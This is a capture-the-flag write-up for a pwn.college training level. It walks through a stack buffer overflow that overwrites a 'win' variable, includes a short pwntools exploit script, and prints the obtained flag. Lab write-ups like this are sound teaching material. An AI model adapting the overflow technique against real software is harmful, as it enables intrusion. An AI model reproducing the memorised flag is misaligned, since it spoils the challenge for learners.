# level2.0
## Description
Overflow a buffer on the stack to set trickier conditions to obtain the flag!
## Solution
- Running `./babymem-level-2-0` we get the following output:
```
###
### Welcome to ./babymem-level-2-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffdc7d257f0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffdc7d257f8 (rsp+0x0008) | e8 69 d2 c7 fd 7f 00 00 | 0x00007ffdc7d269e8 |
| 0x00007ffdc7d25800 (rsp+0x0010) | d8 69 d2 c7 fd 7f 00 00 | 0x00007ffdc7d269d8 |
| 0x00007ffdc7d25808 (rsp+0x0018) | 23 07 41 cc 01 00 00 00 | 0x00000001cc410723 |
| 0x00007ffdc7d25810 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffdc7d25818 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25820 (rsp+0x0030) | 30 58 d2 c7 fd 7f 00 00 | 0x00007ffdc7d25830 |
| 0x00007ffdc7d25828 (rsp+0x0038) | 90 58 d2 c7 fd 7f 00 00 | 0x00007ffdc7d25890 |
| 0x00007ffdc7d25830 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25838 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25840 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25848 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25850 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25858 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25860 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25868 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25870 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25878 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25880 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25888 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffdc7d25890 (rsp+0x00a0) | 00 00 00 00 fd 7f 00 00 | 0x00007ffd00000000 |
| 0x00007ffdc7d25898 (rsp+0x00a8) | 00 ab dd 6c 6d 93 fc 24 | 0x24fc936d6cddab00 |
| 0x00007ffdc7d258a0 (rsp+0x00b0) | e0 68 d2 c7 fd 7f 00 00 | 0x00007ffdc7d268e0 |
| 0x00007ffdc7d258a8 (rsp+0x00b8) | 97 6c e4 27 ae 64 00 00 | 0x000064ae27e46c97 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffdc7d257f0, and our base pointer points to 0x7ffdc7d258a0.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffdc7d25830, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 93 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x50e0a652, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7ffdc7d25890, 96 bytes after the start of your input buffer.

Payload size: 
```
- The program tells us that we need to set the `win` variable to `0x50e0a652` to get the flag.
- The buffer is 93 bytes long, I assume there's 3 bytes of padding between the buffer and the `win` variable.
- If we set our payload size to 100 bytes, we can write `0x50e0a652` to the `win` variable.
- Wrote the following python script to get the flag:
```python
import pwn

padding = b'A' * 96
payload = padding + pwn.p64(0x50e0a652)

r = pwn.process('/challenge/babymem-level-2-0')
r.recvuntil('size:')
r.sendline('100')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- The script uses the `pwn` library to interact with the program.
- Running the script gives us the flag: `pwn.college{8QWHSfDUlNszmYRpFNtfm89KuW0.ddTNzMDL5QTO0czW}`.